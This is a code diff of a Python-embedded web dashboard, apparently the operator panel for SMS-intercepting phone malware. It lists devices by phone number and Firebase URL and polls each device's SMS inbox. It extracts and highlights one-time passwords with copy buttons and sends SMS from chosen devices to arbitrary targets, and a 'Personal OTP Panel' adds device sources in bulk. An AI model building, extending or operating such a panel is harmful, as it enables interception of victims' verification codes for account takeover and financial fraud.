+  const originalText = btn.innerHTML;
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spinner"></span> Sending...';
+
+  fetch('/api/sms/send', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ fb_url: modalFbUrl, device_id: modalDevId, target: finalTarget, message: msg, count: 1 })
+  }).then(r => r.json()).then(d => {
+    closeModal();
+    btn.disabled = false;
+    btn.innerHTML = originalText;
+    if(d.success){ showStatusModal(true, 'Berhasil!', `Pesan terkirim ke ${finalTarget}`); }
+    else { showStatusModal(false, 'Gagal', d.error || 'Unknown error'); }
+  }).catch(e => {
+    closeModal();
+    btn.disabled = false;
+    btn.innerHTML = originalText;
+    showStatusModal(false, 'Error', 'Network error');
+  });
 }
 
 async function checkConn(){
   try{
     const r = await fetch('/api/conn');
     const d = await r.json();
-    const badge = document.getElementById('conn-badge');
-    const txt = document.getElementById('conn-text');
-    if(d.mongo_connected){
-      badge.className = 'conn online';
-      txt.textContent = 'Live';
-    } else {
-      badge.className = 'conn offline';
-      txt.textContent = 'Off';
+    const badge = $('conn-badge');
+    const txt = $('conn-text');
+    if(d.mongo_connected){ badge.className = 'conn online'; txt.textContent = 'Live'; }
+    else { badge.className = 'conn offline'; txt.textContent = 'Off'; }
+  }catch(e){}
+}
+
+async function loadPanelState(){
+  try{
+    const r = await fetch('/api/panel/status_public');
+    const d = await r.json();
+    if(d.success){
+      panelState = d;
+      const wrap = $('session-banner-wrap');
+      if(d.passwordless){
+        wrap.innerHTML = '<div class="session-banner"><span class="pulse-dot"></span>🔓 Passwordless Mode · Access Granted</div>';
+      } else if(d.expires_at > 0){
+        const remaining = Math.max(0, d.expires_at - Math.floor(Date.now()/1000));
+        const hrs = Math.floor(remaining/3600);
+        const mins = Math.floor((remaining%3600)/60);
+        wrap.innerHTML = `<div class="session-banner temp"><span class="pulse-dot" style="background:#f59e0b"></span>⏱ Temp Access · ${hrs}h ${mins}m Remaining</div>`;
+      } else { wrap.innerHTML = ''; }
+      updateSenderUI();
     }
   }catch(e){}
 }
 
-function flash(id){
-  const el = document.getElementById(id);
-  if(!el) return;
-  el.classList.add('flash');
-  setTimeout(()=>el.classList.remove('flash'), 400);
+async function manualRefresh(){
+  const btn = $('refresh-btn');
+  btn.classList.add('spinning');
+  toast('🔄 Refreshing...');
+  try{
+    await fetch('/api/refresh', { method: 'POST' });
+    setTimeout(()=>{ loadNumbers(); btn.classList.remove('spinning'); }, 1500);
+  }catch(e){ btn.classList.remove('spinning'); }
 }
 
 async function loadNumbers(){
@@ -1040,269 +1353,133 @@ async function loadNumbers(){
     const r = await fetch('/api/numbers');
     const d = await r.json();
     if(!d.success){
-      document.getElementById('loading-msg').textContent = '❌ '+(d.error||'Error');
+      if(d.error && d.error.includes('deactivated')){ window.location.reload(); return; }
+      $('loading-text').textContent = '❌ '+(d.error||'ERROR');
       return;
     }
     allNumbers = d.numbers || [];
-    if(parseInt(document.getElementById('s-total').textContent) !== d.total) flash('stat-total');
-    if(parseInt(document.getElementById('s-online').textContent) !== d.online) flash('stat-online');
-    if(parseInt(document.getElementById('s-offline').textContent) !== d.offline) flash('stat-offline');
-    document.getElementById('s-total').textContent = d.total;
-    document.getElementById('s-online').textContent = d.online;
-    document.getElementById('s-offline').textContent = d.offline;
-    document.getElementById('s-otp').textContent = d.otp_rate + '%';
-    document.getElementById('q-dev').textContent = allNumbers.length;
-    document.getElementById('badge-online').textContent = d.online;
-    document.getElementById('badge-offline').textContent = d.offline;
-    if(d.progress){
-      const pct = d.progress.total > 0 ? Math.floor(d.progress.done / d.progress.total * 100) : 0;
-      document.getElementById('prog-fill').style.width = pct + '%';
-      document.getElementById('loading-msg').textContent = `Fetching ${d.progress.done}/${d.progress.total} (${pct}%)...`;
-    }
-    applyLocalFilter();
-    const badge = document.getElementById('live-badge');
-    if(d.loading && allNumbers.length > 0 && badge) badge.style.display = 'inline-flex';
-    else if(badge) badge.style.display = 'none';
+    $('s-total').textContent = d.total;
+    $('s-online').textContent = d.online;
+    $('s-offline').textContent = d.offline;
+    
+    const otpRate = d.otp_rate || 0;
+    $('s-otp').textContent = otpRate + '%';
+    $('otp-circle').setAttribute('stroke-dasharray', `${otpRate}, 100`);
+
     if(allNumbers.length > 0){
-      document.getElementById('loading-text').classList.add('hidden');
-      document.getElementById('list-content').classList.remove('hidden');
-      const sig = allNumbers.length + '|' + d.online + '|' + d.otp_rate + '|' + localFilter;
-      if(sig !== lastSig){ lastSig = sig; renderNumbers(); }
+      $('loading-text').classList.add('hidden');
+      $('list-content').classList.remove('hidden');
+      const sig = allNumbers.length + '|' + d.online + '|' + d.otp_rate + '|' + currentFilter;
+      if(sig !== lastSig){ lastSig = sig; renderNumbers(); updateSenderUI(); }
     } else if(d.loading){
-      document.getElementById('loading-text').classList.remove('hidden');
-      document.getElementById('list-content').classList.add('hidden');
-    } else {
-      document.getElementById('loading-text').classList.remove('hidden');
-      document.getElementById('loading-msg').textContent = '📭 No numbers found';
-      document.getElementById('list-content').classList.add('hidden');
+      $('loading-text').classList.remove('hidden');
     }
-  }catch(e){
-    document.getElementById('loading-msg').textContent = '❌ Network error';
-  }
+  }catch(e){ $('loading-text').textContent = '❌ NETWORK ERROR'; }
 }
 
-// ✅ USER: Raw Data button NAHI
 function renderNumbers(){
-  const q = (document.getElementById('search-num').value || '').toLowerCase();
-  const box = document.getElementById('num-list');
-  const filtered = numbers.filter(n => !q ||
-    (n.number||'').toLowerCase().includes(q) ||
-    (n.device_name||'').toLowerCase().includes(q));
-  if(filtered.length === 0){
-    box.innerHTML = '<div class="empty">📭 No numbers found</div>';
-    return;
-  }
+  const q = ($('search-num').value || '').toLowerCase();
+  const box = $('num-list');
+  
+  let filtered = allNumbers;
+  if(currentFilter === 'online') filtered = filtered.filter(n => n.online);
+  if(currentFilter === 'offline') filtered = filtered.filter(n => !n.online);
+  if(q) filtered = filtered.filter(n => (n.number||'').toLowerCase().includes(q) || (n.device_name||'').toLowerCase().includes(q));
+  
+  $('num-count').textContent = filtered.length;
+  
+  if(filtered.length === 0){ box.innerHTML = '<div class="empty">No numbers found</div>'; return; }
+  
   box.innerHTML = filtered.map(n => {
     const isOnline = n.online === true;
     const isUnknown = (n.number || '').startsWith('UNKNOWN-');
-    const iconCls = isUnknown ? 'gray' : (isOnline ? '' : 'red');
-    const badgeCls = isOnline ? 'badge-online' : 'badge-offline';
-    const badgeTxt = isOnline ? 'Online' : 'Offline';
-    const cardCls = isOnline ? '' : 'offline';
+    const iconCls = isUnknown ? 'unknown-icon' : (isOnline ? '' : 'offline-icon');
+    const badgeCls = isOnline ? 'online' : 'offline';
     const titleCls = isUnknown ? 'unknown' : '';
-    const confidence = n.confidence || 0;
-    let confBadge = '';
-    if(!isUnknown && confidence > 0){
-      confBadge = `<span class="confidence-badge">✓ ${confidence}x</span>`;
-    } else if(!isUnknown){
-      confBadge = `<span class="confidence-badge low">⚠️ 1x</span>`;
-    }
+    const iconEmoji = isUnknown ? '❓' : (isOnline ? '📱' : '📴');
+    
     return `
-      <div class="num-card ${cardCls}">
-        <div class="num-icon ${iconCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})">${isUnknown ? '❓' : '📶'}</div>
-        <div class="num-info" onclick="openInboxGlobal(${numbers.indexOf(n)})">
-          <div class="num-title ${titleCls}">${escapeHtml(n.number)} ${confBadge}</div>
+      <div class="num-card">
+        <div class="num-icon ${iconCls}">${iconEmoji}</div>
+        <div class="num-info" onclick="openInbox('${n.number}', '${n.device_id}', '${n.firebase}', ${isOnline})">
+          <div class="num-title ${titleCls}">${escapeHtml(n.number)}</div>
           <div class="num-sub">
-            <span class="pill">📨 ${n.msg_count} SMS</span>
+            <span class="pill">✉️ ${n.msg_count} SMS</span>
             ${n.otp_count > 0 ? `<span class="pill otp">🔑 ${n.otp_count} OTP</span>` : ''}
           </div>
         </div>
-        <div class="${badgeCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})"><span class="dot"></span>${badgeTxt}</div>
-      </div>
-    `;
+        <div class="card-actions">
+          <button class="icon-btn send-btn" onclick="event.stopPropagation();openSendModal('${n.number}', '${n.device_id}', '${n.firebase}')" title="Send SMS">💬</button>
+        </div>
+        <div class="badge ${badgeCls}"><span class="dot"></span>${isOnline ? 'Online' : 'Offline'}</div>
+      </div>`;
   }).join('');
 }
 
-function openInboxGlobal(idx){
-  if(idx < 0 || idx >= numbers.length) return;
-  openInbox(numbers[idx]);
-}
-
-async function openInbox(n){
-  currentNum = n;
-  lastInboxSig = '';
-  allInboxMsgs = [];
-  lastOtpSeen = '';
-  askNotificationPermission();
-  document.getElementById('list-view').classList.add('hidden');
-  document.getElementById('inbox-view').classList.remove('hidden');
-  const inboxNumEl = document.getElementById('inbox-num');
-  inboxNumEl.textContent = n.number;
-  if((n.number || '').startsWith('UNKNOWN-')){
-    inboxNumEl.className = 'inbox-num unknown';
-  } else {
-    inboxNumEl.className = 'inbox-num';
-  }
-  const statusEl = document.getElementById('inbox-status');
-  const statusTxt = document.getElementById('inbox-status-text');
-  if(n.online === true){
-    statusEl.className = 'inbox-status';
-    statusTxt.textContent = 'Online';
-  } else {
-    statusEl.className = 'inbox-status offline';
-    statusTxt.textContent = 'Offline';
-  }
-  document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Loading messages...</div>';
+async function openInbox(num, devId, fbUrl, isOnline){
+  currentNum = { number: num, device_id: devId, firebase: fbUrl, online: isOnline };
+  lastInboxSig = ''; allInboxMsgs = [];
+  
+  $('list-view').classList.add('hidden');
+  $('inbox-view').classList.remove('hidden');
+  
+  const inboxNumEl = $('inbox-num');
+  inboxNumEl.textContent = num;
+  
+  const statusEl = $('inbox-status');
+  const statusTxt = $('inbox-status-text');
+  if(isOnline){ statusEl.className = 'inbox-status'; statusTxt.textContent = 'Online'; }
+  else { statusEl.className = 'inbox-status offline'; statusTxt.textContent = 'Offline'; }
+  
+  $('sms-container').innerHTML = '<div style="text-align:center;padding:40px;color:#94a3b8"><span class="spinner-dark" style="display:inline-block;margin-right:8px"></span> Loading...</div>';
+  
   await loadInbox(false);
   if(refreshTimer) clearInterval(refreshTimer);
-  refreshTimer = setInterval(()=>loadInbox(false), 1000);
-}
-
-function findTopNumber(msgs){
-  const counter = {};
-  const senderNums = new Set();
-  msgs.forEach(m => {
-    const from = m.from || '';
-    const found = from.match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || [];
-    found.forEach(n => senderNums.add(n));
-  });
-  msgs.forEach(m => {
-    const text = m.message || '';
-    const found = text.match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || [];
-    found.forEach(n => {
-      if(senderNums.has(n)) return;
-      if(n.startsWith('1800') || n.startsWith('1900') || n.startsWith('1991')) return;
-      counter[n] = (counter[n] || 0) + 1;
-    });
-  });
-  let topNum = null, topCount = 0;
-  for(const [num, cnt] of Object.entries(counter)){
-    if(cnt > topCount){ topNum = num; topCount = cnt; }
-  }
-  return topNum ? {number: topNum, count: topCount} : null;
-}
-
-function updateTopNumberBadge(msgs){
-  const badge = document.getElementById('top-number-badge');
-  const top = findTopNumber(msgs);
-  if(top && top.count >= 2){
-    document.getElementById('tn-num').textContent = '📞 ' + top.number;
-    document.getElementById('tn-count-badge').textContent = top.count + ' bar';
-    badge.classList.remove('hidden');
-  } else {
-    badge.classList.add('hidden');
-  }
+  refreshTimer = setInterval(()=>loadInbox(false), 2000);
 }
 
 async function loadInbox(showLoader){
   if(!currentNum) return;
-  if(showLoader){
-    document.getElementById('sms-container').innerHTML =
-      '<div class="empty"><span class="spinner"></span> Refreshing...</div>';
-  }
-  const controller = new AbortController();
-  const timeoutId = setTimeout(() => controller.abort(), 15000);
+  if(showLoader){ $('sms-container').innerHTML = '<div style="text-align:center;padding:40px;color:#94a3b8"><span class="spinner-dark" style="display:inline-block;margin-right:8px"></span> Refreshing...</div>'; }
   try{
-    const r = await fetch('/api/inbox?fb=' + encodeURIComponent(currentNum.firebase)
-      + '&id=' + encodeURIComponent(currentNum.device_id)
-      + '&num=' + encodeURIComponent(currentNum.number), { signal: controller.signal });
-    clearTimeout(timeoutId);
+    const r = await fetch('/api/inbox?fb=' + encodeURIComponent(currentNum.firebase) + '&id=' + encodeURIComponent(currentNum.device_id) + '&num=' + encodeURIComponent(currentNum.number));
     const d = await r.json();
-    if(!d.success){
-      document.getElementById('sms-container').innerHTML =
-        '<div class="empty">❌ '+(d.error||'Error')+'</div>';
-      return;
-    }
-    const msgs = d.messages || [];
-    allInboxMsgs = msgs;
-    if(msgs.length > 0){
-      const newest = msgs[0];
-      const newestOtp = newest.otp || extractOtp(newest.message);
-      const sig = (newest.timestamp || 0) + '|' + newestOtp + '|' + (newest.message||'').slice(0,40);
-      if(newestOtp && sig !== lastOtpSeen){
-        lastOtpSeen = sig;
-        showOtpNotification(newestOtp, newest.from || 'Unknown', newest.message || '');
-      }
-    }
+    if(!d.success){ $('sms-container').innerHTML = '<div style="text-align:center;padding:40px;color:#ef4444">❌ '+(d.error||'ERROR')+'</div>'; return; }
+    const msgs = d.messages || []; allInboxMsgs = msgs;
     const sig = msgs.map(m => (m.timestamp||0) + '|' + (m.message||'').slice(0,40)).join('#');
-    if(sig !== lastInboxSig){
-      lastInboxSig = sig;
-      renderMessages();
-    }
-  }catch(e){
-    clearTimeout(timeoutId);
-  }
-}
-
-function timeAgo(ts, now){
-  if(!ts) return '';
-  const diff = now - ts;
-  if(diff < 10) return 'अभी';
-  if(diff < 60) return `${diff}s पहले`;
-  if(diff < 3600) return `${Math.floor(diff/60)}m पहले`;
-  if(diff < 86400) return `${Math.floor(diff/3600)}h पहले`;
-  return `${Math.floor(diff/86400)}d पहले`;
-}
-
-function highlightPhoneNumbers(text){
-  return text.replace(/(?<!\d)([6-9]\d{9})(?!\d)/g, '<span class="phone-highlight">$1</span>');
+    if(sig !== lastInboxSig){ lastInboxSig = sig; renderMessages(); }
+  }catch(e){}
 }
 
 function renderMessages(){
-  const box = document.getElementById('sms-container');
+  const box = $('sms-container');
   const now = Math.floor(Date.now() / 1000);
-  let msgs = [...allInboxMsgs]
-    .sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0))
-    .slice(0, 60);
+  let msgs = [...allInboxMsgs].sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 60);
   
-  updateTopNumberBadge(msgs);
+  if(!msgs.length){ box.innerHTML = '<div style="text-align:center;padding:40px;color:#94a3b8">📭 No SMS messages found</div>'; return; }
   
-  if(!msgs.length){
-    box.innerHTML = `<div class="empty">📭 No SMS</div>`;
-    return;
-  }
   box.innerHTML = '<div class="sms-list">' + msgs.map(m => {
     const otp = m.otp || extractOtp(m.message);
-    let body;
-    if(otp){
-      body = escapeHtml(m.message).replace(otp, `<span class="otp-highlight">${otp}</span>`);
-      body = highlightPhoneNumbers(body);
-    } else {
-      body = highlightPhoneNumbers(escapeHtml(m.message));
-    }
-    const copyBtn = otp
-      ? `<button class="otp-copy-btn" onclick="copyOtp('${otp}')">📋 Copy OTP ${otp}</button>`
-      : '';
-    const ts = m.timestamp || 0;
-    const isFresh = ts >= (now - 120);
-    const cls = isFresh ? 'fresh' : (otp ? 'otp-item' : '');
+    let body = otp ? escapeHtml(m.message).replace(otp, `<span class="otp-highlight">${otp}</span>`) : escapeHtml(m.message);
+    const copyBtn = otp ? `<button class="otp-copy-btn" onclick="copyOtp('${otp}')">📋 Copy OTP ${otp}</button>` : '';
+    const ts = m.timestamp || 0; const isFresh = ts >= (now - 120);
     const timeStr = m.date_string ? m.date_string : fmtTime(ts);
-    const ago = timeAgo(ts, now);
-    const newBadge = isFresh ? '<span class="new-badge">NEW</span>' : '';
-    const hasNumber = /[6-9]\d{9}/.test(m.message || '');
-    let typeBadge = '';
-    if(otp){ typeBadge = '<span class="msg-type-badge otp">OTP</span>'; }
-    else if(hasNumber){ typeBadge = '<span class="msg-type-badge number">📞 NUM</span>'; }
+    
     return `
-      <div class="sms-item ${cls}">
-        ${typeBadge}
+      <div class="sms-item ${isFresh?'fresh':''}">
         <div class="sms-head">
-          <div class="sender">${escapeHtml(m.from || 'Unknown')} ${newBadge}</div>
-          <div style="text-align:right">
-            <div class="sms-time ${isFresh?'fresh':''}">${escapeHtml(timeStr)}</div>
-            <div class="time-ago ${isFresh?'fresh':''}">${ago}</div>
-          </div>
+          <div class="sender">${escapeHtml(m.from || 'UNKNOWN')}</div>
+          <div class="sms-time">${escapeHtml(timeStr)}</div>
         </div>
         <div class="sms-body">${body}</div>
         ${copyBtn}
-      </div>
-    `;
+      </div>`;
   }).join('') + '</div>';
 }
 
 function backToList(){
-  document.getElementById('inbox-view').classList.add('hidden');
-  document.getElementById('list-view').classList.remove('hidden');
+  $('inbox-view').classList.add('hidden');
+  $('list-view').classList.remove('hidden');
   if(refreshTimer){ clearInterval(refreshTimer); refreshTimer = null; }
   currentNum = null;
 }
@@ -1310,882 +1487,167 @@ function backToList(){
 function extractOtp(text){
   if(!text) return '';
   const t = String(text);
-  let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})/i);
-  if(m) return m[1];
-  m = t.match(/(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)/i);
-  if(m) return m[1];
-  m = t.match(/#(\d{4,8})/);
-  if(m) return m[1];
+  let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})/i); if(m) return m[1];
+  m = t.match(/(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)/i); if(m) return m[1];
+  m = t.match(/#(\d{4,8})/); if(m) return m[1];
   return '';
 }
 
 function fmtTime(ts){
   if(!ts) return '';
   try{
-    let t = parseInt(ts);
-    if(t > 1e12) t = Math.floor(t/1000);
-    if(t < 1e9) return String(ts);
+    let t = parseInt(ts); if(t > 1e12) t = Math.floor(t/1000); if(t < 1e9) return String(ts);
     const d = new Date(t * 1000);
-    const opts = { timeZone: 'Asia/Kolkata', hour12: true, day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' };
-    return d.toLocaleString('en-IN', opts).replace(',', ' |');
+    return d.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true, day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit' });
   }catch(e){ return String(ts); }
 }
 
 function copyOtp(code){
-  const done = ()=>toast('✅ Copied: ' + code);
-  if(navigator.clipboard){
-    navigator.clipboard.writeText(code).then(done).catch(()=>{
-      const ta = document.createElement('textarea');
-      ta.value = code; document.body.appendChild(ta);
-      ta.select(); document.execCommand('copy'); ta.remove(); done();
-    });
-  }
+  if(navigator.clipboard){ navigator.clipboard.writeText(code).then(()=>toast('✅ COPIED: ' + code)).catch(()=>{}); }
+  else { toast('✅ COPIED: ' + code); }
 }
 
-function escapeHtml(s){
-  return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({
-    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
-  })[c]);
-}
+function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
 
 checkConn();
+loadPanelState();
 loadNumbers();
 setInterval(checkConn, 8000);
+setInterval(loadPanelState, 5000);
 setInterval(()=>{ if(!currentNum) loadNumbers(); }, 5000);
 </script>
 </body>
 </html>
 """
 
-
-# ==================== PERSONAL OTP PANEL ====================
-PERSONAL_OTP_HTML = r"""<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><title>Personal OTP Panel</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<meta name="theme-color" content="#059669">
-<style>""" + MOBILE_CSS + r"""
-body{background:#f7f8fc;color:#1e293b;min-height:100vh;padding:0 0 40px}
-.topbar{background:#fff;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 1px 3px rgba(0,0,0,.05);flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top))}
-.brand{font-size:17px;font-weight:800;letter-spacing:-.5px}
-.brand .alex{background:linear-gradient(90deg,#059669,#10b981);-webkit-background-clip:text;background-clip:text;color:transparent}
-.brand .panel{color:#1e293b}
-.top-actions{display:flex;align-items:center;gap:8px}
-.refresh-btn{background:linear-gradient(135deg,#059669,#10b981);color:#fff;border:none;width:42px;height:42px;border-radius:50%;font-size:18px;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 12px rgba(5,150,105,.3);padding:0}
-.refresh-btn:active{transform:scale(.9) rotate(180deg)}
-.refresh-btn.spinning{animation:spin 1s linear infinite}
-@keyframes spin{to{transform:rotate(360deg)}}
-.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between}
-@media(min-width:640px){.nav{order:0;width:auto}}
-.nav-link{padding:10px 14px;border-radius:10px;text-decoration:none;font-size:13px;font-weight:600;color:#475569;background:#f1f5f9;white-space:nowrap;min-height:44px;display:inline-flex;align-items:center}
-.nav-link.active{background:linear-gradient(135deg,#059669,#10b981);color:#fff}
-.nav-link.purple{background:linear-gradient(135deg,#ede9fe,#ddd6fe);color:#6d28d9}
-.conn{display:flex;align-items:center;gap:6px;font-size:11px;font-weight:600;padding:6px 10px;border-radius:20px}
-.conn.online{color:#16a34a;background:#dcfce7}
-.conn.offline{color:#dc2626;background:#fee2e2}
-.conn.loading{color:#d97706;background:#fef3c7}
-.conn .dot{width:8px;height:8px;border-radius:50%;background:currentColor}
-.conn.online .dot{animation:pulse 1.5s infinite}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
-.container{max-width:900px;margin:0 auto;padding:14px}
-.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px}
-.stat{background:#fff;border-radius:14px;padding:14px;box-shadow:0 2px 8px rgba(99,102,241,.06)}
-.stat .label{font-size:10px;color:#94a3b8;font-weight:600;letter-spacing:.5px;text-transform:uppercase;margin-bottom:6px}
-.stat .value{font-size:26px;font-weight:800;letter-spacing:-1px}
-.stat.total .value{color:#2563eb}
-.stat.online .value{color:#16a34a}
-.stat.offline .value{color:#dc2626}
-.stat.otp .value{color:#a855f7}
-.quick{background:#fff;border-radius:14px;padding:14px;margin-bottom:14px;display:flex;justify-content:space-between;align-items:center;box-shadow:0 2px 8px rgba(99,102,241,.06);flex-wrap:wrap;gap:10px}
-.quick .info{font-size:13px;color:#475569}
-.quick .info b{color:#1e293b;font-size:15px}
-.filter-live{display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap}
-.filter-live-btn{flex:1;min-width:130px;padding:14px 12px;border-radius:12px;border:2px solid transparent;cursor:pointer;font-size:13px;font-weight:700;display:flex;align-items:center;justify-content:center;gap:6px;background:none;font-family:inherit;min-height:52px}
-.filter-live-btn:active{transform:scale(.97)}
-.filter-live-btn.online{background:linear-gradient(135deg,#dcfce7,#bbf7d0);color:#166534;border-color:#86efac}
-.filter-live-btn.offline{background:linear-gradient(135deg,#fee2e2,#fecaca);color:#991b1b;border-color:#fca5a5}
-.filter-live-btn.active-filter{box-shadow:0 0 0 4px rgba(99,102,241,.3)}
-.filter-live-btn .count-badge{background:rgba(0,0,0,.15);padding:2px 8px;border-radius:10px;font-size:11px}
-.list-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;padding:0 4px}
-.list-header h2{font-size:14px;font-weight:700;color:#334155}
-.list-header .count{font-size:12px;color:#64748b;background:#e2e8f0;padding:3px 10px;border-radius:20px;font-weight:600}
-.search-box{margin-bottom:12px}
-.search-box input{width:100%;padding:14px 16px;border-radius:12px;border:1.5px solid #e2e8f0;background:#fff;outline:none;color:#1e293b}
-.search-box input:focus{border-color:#10b981}
-.num-card{background:#fff;border-radius:14px;padding:14px;margin-bottom:10px;display:flex;align-items:center;gap:12px;cursor:pointer;min-height:70px}
-.num-card:active{transform:scale(.98);background:#fafafa}
-.num-icon{width:42px;height:42px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:19px;flex-shrink:0;background:linear-gradient(135deg,#dcfce7,#bbf7d0)}
-.num-icon.red{background:linear-gradient(135deg,#fee2e2,#fecaca)}
-.num-icon.gray{background:linear-gradient(135deg,#f1f5f9,#e2e8f0)}
-.num-info{flex:1;min-width:0}
-.num-title{font-size:14px;font-weight:700;color:#1e293b;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.num-title.unknown{color:#94a3b8;font-style:italic}
-.num-sub{font-size:11px;color:#94a3b8;margin-top:4px;display:flex;gap:4px;flex-wrap:wrap}
-.num-sub .pill{background:#f1f5f9;padding:2px 7px;border-radius:6px;color:#64748b;font-size:10px;font-weight:600}
-.num-sub .pill.otp{background:#ede9fe;color:#7c3aed}
-.badge-online{display:flex;align-items:center;gap:5px;font-size:11px;color:#16a34a;font-weight:600;flex-shrink:0}
-.badge-online .dot{width:8px;height:8px;border-radius:50%;background:#16a34a}
-.badge-offline{display:flex;align-items:center;gap:5px;font-size:11px;color:#dc2626;font-weight:600;flex-shrink:0}
-.badge-offline .dot{width:8px;height:8px;border-radius:50%;background:#dc2626}
-.arrow{color:#cbd5e1;font-size:20px}
-.fb-add-card{background:linear-gradient(135deg,#ecfdf5,#d1fae5);border:2px solid #6ee7b7;border-radius:14px;padding:16px;margin-bottom:14px}
-.fb-add-card h3{font-size:13px;font-weight:700;color:#065f46;margin-bottom:10px;display:flex;align-items:center;gap:8px}
-.fb-add-row{display:flex;gap:8px;flex-wrap:wrap}
-.fb-add-row input{flex:1;min-width:180px;padding:14px 12px;border-radius:10px;border:1.5px solid #6ee7b7;background:#fff;outline:none;color:#1e293b;font-family:monospace}
-.fb-add-row input:focus{border-color:#10b981;box-shadow:0 0 0 4px rgba(16,185,129,.15)}
-.fb-add-row button{padding:14px 18px;border:none;border-radius:10px;font-weight:600;font-size:14px;min-height:50px}
-.fb-add-row button.primary{background:linear-gradient(135deg,#059669,#10b981);color:#fff}
-.fb-add-row button.gray{background:#f1f5f9;color:#475569}
-.fb-add-row button:active{transform:scale(.96)}
-.bulk-area{margin-top:10px;display:none}
-.bulk-area textarea{width:100%;padding:14px 12px;border-radius:10px;border:1.5px solid #6ee7b7;background:#fff;font-size:13px;min-height:120px;font-family:monospace;outline:none;color:#1e293b;resize:vertical}
-.bulk-area button{margin-top:8px;padding:12px 18px;border:none;border-radius:10px;font-weight:600;font-size:13px;background:linear-gradient(135deg,#059669,#10b981);color:#fff;min-height:48px}
-.fb-msg{margin-top:10px;padding:12px 14px;border-radius:10px;font-size:13px;display:none}
-.fb-msg.ok{background:#dcfce7;color:#166534;display:block}
-.fb-msg.err{background:#fee2e2;color:#991b1b;display:block}
-.my-fb-list{display:grid;gap:8px;margin-top:10px}
-.my-fb-card{background:#fff;border:1.5px solid #e2e8f0;border-radius:12px;padding:12px;display:flex;align-items:center;gap:10px}
-.my-fb-card .fb-icon{width:38px;height:38px;border-radius:9px;background:linear-gradient(135deg,#d1fae5,#a7f3d0);display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
-.my-fb-card .fb-info{flex:1;min-width:0}
-.my-fb-card .fb-label{font-size:12px;font-weight:700;color:#065f46;word-break:break-all}
-.my-fb-card .fb-hash{font-size:10px;color:#94a3b8;font-family:monospace;margin-top:2px}
-.my-fb-card .fb-actions button{padding:10px 14px;font-size:12px;background:#fef2f2;color:#dc2626;border:none;border-radius:8px;font-weight:600;min-height:42px}
-.inbox-header{background:#fff;border-radius:14px;padding:16px;margin-bottom:12px;box-shadow:0 2px 8px rgba(99,102,241,.06)}
-.inbox-top{display:flex;align-items:center;gap:10px;margin-bottom:12px}
-.back-btn{background:#f1f5f9;border:none;width:42px;height:42px;border-radius:50%;font-size:18px;cursor:pointer;color:#475569;font-weight:600;text-decoration:none;display:inline-flex;align-items:center;justify-content:center;flex-shrink:0}
-.back-btn:active{transform:scale(.9)}
-.inbox-num{font-size:16px;font-weight:800;color:#1e293b}
-.inbox-num.unknown{color:#94a3b8;font-style:italic}
-.inbox-status{display:flex;align-items:center;gap:6px;font-size:12px;color:#16a34a;font-weight:600;margin-top:2px}
-.inbox-status .dot{width:8px;height:8px;border-radius:50%;background:#16a34a}
-.inbox-status.offline{color:#dc2626}
-.inbox-status.offline .dot{background:#dc2626}
-.inbox-meta{font-size:11px;color:#94a3b8;display:flex;justify-content:space-between;align-items:center}
-.refresh-icon{cursor:pointer;font-size:20px;color:#94a3b8;padding:6px;min-width:36px;min-height:36px;display:flex;align-items:center;justify-content:center}
-.refresh-icon:active{transform:scale(.9)}
-.refresh-icon.spinning{animation:spin 1s linear infinite}
-.top-number-badge{background:linear-gradient(135deg,#fef3c7,#fde68a);border:2px solid #fbbf24;border-radius:12px;padding:12px 14px;margin-bottom:12px;display:flex;align-items:center;gap:10px;font-size:13px;font-weight:700;color:#92400e;box-shadow:0 2px 8px rgba(251,191,36,.2)}
-.top-number-badge .tn-icon{font-size:22px;flex-shrink:0}
-.top-number-badge .tn-info{flex:1;min-width:0}
-.top-number-badge .tn-num{font-size:16px;font-weight:800;color:#78350f;letter-spacing:.5px;word-break:break-all}
-.top-number-badge .tn-count{font-size:11px;color:#92400e;font-weight:600;margin-top:2px;opacity:.8}
-.top-number-badge .tn-highlight{background:#fbbf24;color:#78350f;padding:2px 8px;border-radius:8px;font-weight:800;font-size:11px}
-.sms-list{background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(99,102,241,.06)}
-.sms-item{padding:16px;border-bottom:1px solid #f1f5f9;position:relative}
-.sms-item:last-child{border-bottom:none}
